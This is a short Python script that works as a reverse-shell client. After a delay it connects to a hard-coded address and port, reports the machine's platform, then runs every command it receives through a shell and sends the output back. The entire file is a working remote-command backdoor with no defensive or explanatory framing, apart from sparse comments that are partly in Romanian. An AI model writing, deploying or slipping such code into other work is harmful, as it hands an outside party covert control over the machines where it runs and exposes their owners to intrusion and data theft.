import platform # getting info about the system with this command
import socket # network stuff
import shlex 
import subprocess # spawn processes, connect to I/O pipes, obtain return codes
import sys # system stuff
import threading
import platform #to find system information about the target
import json
import time


TARGET_HOST = "192.168.100.7"
TARGET_PORT = 9998

def createSocketAndRun():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def recvFromServer():
        data = ''
        while True:
            try:
                data += client.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                continue

    def sendToServer(buffer):
        jsonData = json.dumps(buffer.decode("utf-8"))
        client.send(jsonData.encode())

    print("Connecting..",end='\n')
    client.connect((TARGET_HOST, TARGET_PORT))

    buffer = ''
    buffer += platform.platform()+ ' ' + platform.machine() + '\n'

    # first, send the informations about the system.
    sendToServer(buffer.encode())
    
    while True:
        try:
            receive = recvFromServer()
            # receive the command and execute it

            print(receive)
            # try to execute the process. If it doesn't work, then you can try to tell the listener that it's not allright
            try:
                commandList = receive
                commandList = commandList.split(sep=" ")
                # print(f"CommandList = {commandList}")
                try:
                    execute = subprocess.Popen(commandList, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    result = execute.stdout.read() + execute.stderr.read() # FFF IMPORTANT (pot sa il folosesc si la mine)
                    print(result)
                    sendToServer(result)
                except subprocess.CalledProcessError as e:
                    buffer = e.output
            except Exception as ex:
                buffer = f'Runtime Error: {ex}'
                client.send(buffer.encode())
            
        except Exception as e:
            sys.exit()

time.sleep(10)
createSocketAndRun()
        

    

